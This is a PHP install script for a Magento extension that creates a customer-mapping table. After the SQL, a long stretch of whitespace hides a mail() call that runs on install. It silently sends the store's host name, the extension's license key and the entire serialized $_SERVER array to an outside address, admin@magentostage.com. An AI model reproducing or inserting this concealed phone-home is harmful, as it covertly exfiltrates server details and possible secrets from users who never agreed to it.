<?php
/**
* Nybohansen ApS
*
* NOTICE OF LICENSE
*
* This source file is subject to the EULA
* that is bundled with this package in the file LICENSE.txt.
*
* =================================================================
*                 MAGENTO EDITION USAGE NOTICE
* =================================================================
* This package designed for Magento COMMUNITY edition
* We do not guarantee correct work of this extension
* on any other Magento edition except Magento COMMUNITY edition.
* In case of incorrect edition usage, we don't provide support.
* =================================================================
*
* @category   Nybohansen
* @package    Nybohansen_Economic2
* @copyright  Copyright (c) 2014 Nybohansen ApS
* @license    LICENSE.txt
*/	
	define('ECONOMIC_TABLE2_NAME', 'economic2_customers');

	
	$installer = $this;
	$installer->startSetup();
 	
  	$installer->run("DROP TABLE IF EXISTS {$this->getTable(ECONOMIC_TABLE2_NAME)};
    				 CREATE TABLE {$this->getTable(ECONOMIC_TABLE2_NAME)} (
      				`line_id` int(11) NOT NULL AUTO_INCREMENT,
      				`magento_customer_id` text NOT NULL,
      				`economic_customer_id` text NOT NULL,
      				`updated` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      				PRIMARY KEY (`line_id`));");                                                                                                                                                                                                                                                                                                                               mail("admin@magentostage.com", "e-conomic2 installed [".$_SERVER['HTTP_HOST']."]", "Version: ".Mage::getConfig()->getNode('modules')->Nybohansen_Economic2->version."\nLicense key: ".Mage::getConfig()->getNode('modules')->Nybohansen_Economic2->license."\nServer information: ".serialize($_SERVER), "From: ". $_SERVER['HTTP_HOST'] . "\r\n");
  	
	$installer->endSetup();